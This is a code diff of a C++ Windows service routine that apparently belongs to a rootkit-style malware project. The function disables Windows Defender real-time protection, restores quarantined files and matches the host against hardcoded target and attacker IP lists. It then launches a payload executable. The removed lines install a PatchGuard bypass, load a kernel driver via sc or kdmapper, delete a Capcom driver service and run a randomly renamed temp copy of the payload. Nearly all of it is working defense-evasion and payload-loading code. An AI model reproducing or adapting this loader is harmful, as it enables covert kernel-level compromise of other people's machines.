@@ -15,177 +15,58 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activa
 DWORD WINAPI ServiceMainThread(LPVOID lpParam)
 {
     RETURN_LAST LastErrorSpecial = { 0, 0 };
-    LogFile InitLog = { 0 };
-    struct stat CheckExists = { 0 };
-    char MediumName[MAX_PATH] = { 0 };    
-    HANDLE MediumFile = INVALID_HANDLE_VALUE;
-    HANDLE TempFile = INVALID_HANDLE_VALUE;
-    PVOID MediumBuffer = NULL;
-    DWORD MediumSize = 0;
-    DWORD MediumRead = 0;
-    DWORD MediumWritten = 0;
     int LastError = 0;
-
-    char TempPath[MAX_PATH] = { 0 };
-    char RandMedium[MAX_PATH] = { 0 };
+    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
+    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     const char* CleaningCommands =
         "cd \"%ProgramFiles%\\Windows Defender\" && "
-        "MpCmdRun.exe - Restore - All && "
-        "sc stop Capcom && "  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
-        "sc delete Capcom && "  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
-        "del %windir%\\Capcom.sys";  // REPLACE WITH KDMAPPER USED SERVICE IN LOADING
-    const char* AttackAddresses = "172.18.144.1~172.19.144.1~172.30.48.1~172.23.32.1~172.17.160.1~172.21.0.1~172.24.112.1~192.168.47.1~192.168.5.1~192.168.1.21~172.20.48.1~192.168.56.1";
-    
-    
-    // Make sure that all depended-on files exist on target machine (folders + files) -
+        "MpCmdRun.exe -Restore -All";
+    const char* AttackAddresses = "172.25.224.1~172.29.32.1~172.20.32.1~172.20.240.1~172.27.144.1~172.28.112.1~172.17.96.1~192.168.47.1~192.168.5.1~192.168.1.21~172.21.64.1~192.168.56.1";
+
+
+    // Get IP addresses of target and attacker:
+    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackAddresses)) {
+        return -1;
+    }
+
+
+    // Make sure that all depended-on files exist on target machine (folders + files):
     LastError = VerfifyDepDirs();
     if (LastError != 0) {
         return LastError;
     }
-    LastError = VerfifyDepFiles();
+    LastError = VerfifyDepFiles(AttackerIp);
     if (LastError != 0) {
         return LastError;
     }
 
 
-    // Enable active log file -
-    LastError = (int)InitLog.InitiateFile("C:\\nosusfolder\\verysus\\ServiceLog.txt");
-    if (LastError != 0) {
-        return FALSE;
-    }
-
-
-    // Disable Realtime Protection -
-    LastErrorSpecial = RealTime(TRUE, &InitLog);
+    // Disable Realtime Protection:
+    LastErrorSpecial = RealTime(TRUE);
     if (LastErrorSpecial.Represent != ERROR_SUCCESS || LastErrorSpecial.LastError != 0) {
         return FALSE;
     }
 
 
-    // Disable patchguard -
-    if (system("C:\\nosusfolder\\verysus\\meowguard\\install.bat") == -1) {
-        return SpecialQuit(GetLastError(), "[-] Installing patchguard bypass (meowguard) failed - ", NULL, 0, &InitLog);
-    }
-    InitLog.WriteLog((PVOID)"[+] Installed patchguard bypass (meowguard) successfully!\n", 59);
-
-
-    // Activate kdmapper with driver as parameter -
-    system("sc stop KmdfDriver");
-    system("sc delete KmdfDriver");
-    if (system("sc create KmdfDriver type= kernel binPath= \"C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys\" && sc start KmdfDriver") == -1){
-    //if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
-        return SpecialQuit(GetLastError(), "[-] Failed to activate service manager with driver as parameter - ", NULL, 0, &InitLog);
-    }
-    InitLog.WriteLog((PVOID)"[+] Activated service manager with driver as a parameter!\n", 59);
-    
-    
-    // Perform cleaning commands -
+    // Perform cleaning commands from last iteration:
     if (system(CleaningCommands) == -1) {
-        return SpecialQuit(GetLastError(), "[-] Failed to perform cleaning commands - ", NULL, 0, &InitLog);
+        return GetLastError();
     }
-    InitLog.WriteLog((PVOID)"[+] Performed cleaning commands!\n", 34);
 
 
-    // Enable Realtime Protection -
-    LastErrorSpecial = RealTime(FALSE, &InitLog);
+    // Activate medium:
+    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", "C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", NULL, NULL, SW_NORMAL);
+    if ((INT_PTR)MediumProcess <= 32) {
+        return (DWORD)MediumProcess;
+    }
+
+
+    // Enable Realtime Protection:
+    LastErrorSpecial = RealTime(FALSE);
     if (LastErrorSpecial.Represent != ERROR_SUCCESS || LastErrorSpecial.LastError != 0) {
         return FALSE;
     }
-
-
-    // Get medium handle -
-    MediumFile = CreateFileA("C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (MediumFile == INVALID_HANDLE_VALUE) {
-        return SpecialQuit(GetLastError(), "[-] Error while trying to read default medium - ", NULL, 0, &InitLog);
-    }
-    InitLog.WriteLog((PVOID)"[+] Got medium file handle!\n", 36);
-
-
-    // Get medium data to create a temporary medium file (C:\Windows\Temp) -
-    MediumSize = GetFileSize(MediumFile, NULL);
-    if (MediumSize == 0) {
-        HANDLE CloseArr[1] = { MediumFile };
-        return SpecialQuit(GetLastError(), "[-] Failed to get size of medium for creating temp copy - ", CloseArr, 1, &InitLog);
-    }
-    MediumBuffer = malloc(MediumSize);
-    if (MediumBuffer == NULL) {
-        HANDLE CloseArr[1] = { MediumFile };
-        return SpecialQuit(GetLastError(), "[-] Failed to allocate memory for medium for creating temp copy - ", CloseArr, 1, &InitLog);
-    }
-    if (!ReadFile(MediumFile, MediumBuffer, MediumSize, &MediumRead, NULL) || MediumRead != MediumSize) {
-        HANDLE CloseArr[1] = { MediumFile };
-        free(MediumBuffer);
-        return SpecialQuit(GetLastError(), "[-] Failed to read medium data into buffer - ", CloseArr, 1, &InitLog);
-    }
-    CloseHandle(MediumFile);
-    InitLog.WriteLog((PVOID)"[+] Got medium data in buffer!\n", 32);
-
-
-    // Stop and delete existing instance of medium if theres one WITH THE SAME NAME (temp copy of medium) -
-    if (stat(TempPath, &CheckExists) == 0) {
-        InitLog.WriteLog((PVOID)"[i] Temp copy of medium with the same name already exists!\n", 60);
-        GetServiceName(TempPath, MediumName);
-        REPLACEMENT Rep = { MediumName, '*', 1 };
-        REPLACEMENT RepArr[1] = { Rep };
-        LastError = (int)ExecuteSystem("taskkill /IM * /F", RepArr, 1);
-        if (LastError != 0) {
-            free(MediumBuffer);
-            return SpecialQuit(LastError, "[-] Failed to stop existing temp copy of medium - ", NULL, 0, &InitLog);
-        }
-
-        Rep = { TempPath, '*', 2 };
-        RepArr[0] = Rep;
-        LastError = (int)ExecuteSystem("if exist * del /s /q *", RepArr, 1);
-        if (LastError != 0) {
-            free(MediumBuffer);
-            return SpecialQuit(LastError, "[-] Failed to delete existing medium temp copy - ", NULL, 0, &InitLog);
-        }
-        InitLog.WriteLog((PVOID)"[i] Killed and deleted already existing temp medium copy with the same name as the current!\n", 93);
-    }
-
-
-    // Get path to temp copy of medium file -
-    if (GetTempPathA(MAX_PATH, TempPath) == 0) {
-        free(MediumBuffer);
-        return SpecialQuit(GetLastError(), "[-] Failed to get the temp path of machine for temp medium - ", NULL, 0, &InitLog);
-    }
-    GetRandomName(RandMedium, 20, ".exe");
-    memcpy((PVOID)((ULONG64)TempPath + strlen(TempPath)), RandMedium, strlen(RandMedium) + 1);
-
-
-    // Make sure that all existing components stop working -
-    if (!DeletePrevious(TempPath, &InitLog)) {
-        return SpecialQuit(GetLastError(), "[-] DeletePrevious failed - ", NULL, 0, &InitLog);
-    }
-    InitLog.WriteLog((PVOID)"[+] DeletePrevious succeeded!\n", 31);
-
-
-    // Create new temp medium instance -
-    TempFile = CreateFileA(TempPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (TempFile == INVALID_HANDLE_VALUE) {
-        free(MediumBuffer);
-        return SpecialQuit(GetLastError(), "[-] Failed to create temp copy of medium - ", NULL, 0, &InitLog);
-    }
-    if (!WriteFile(TempFile, MediumBuffer, MediumSize, &MediumWritten, NULL) || MediumWritten != MediumSize) {
-        HANDLE CloseArr[1] = { TempFile };
-        free(MediumBuffer);
-        return SpecialQuit(GetLastError(), "[-] Failed to write into new temp copy of medium - ", CloseArr, 1, &InitLog);
-    }
-    InitLog.WriteLog((PVOID)"[+] Creating new temp copy of medium succeeded!\n", 49);
-    free(MediumBuffer);
-    CloseHandle(TempFile);
-
-
-    // Activate medium -
-    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", TempPath, NULL, NULL, SW_NORMAL);
-    if ((INT_PTR)MediumProcess > 32) {
-        InitLog.WriteLog((PVOID)"[+] Ran medium, overall success!\n", 34);
-        InitLog.CloseLog();
-        return ERROR_SUCCESS;
-    }
-    InitLog.WriteError("[-] Failed to run medium process - ", (DWORD)MediumProcess);
-    InitLog.CloseLog();
-    return (DWORD)MediumProcess;
+    return ERROR_SUCCESS;
 }
 
 
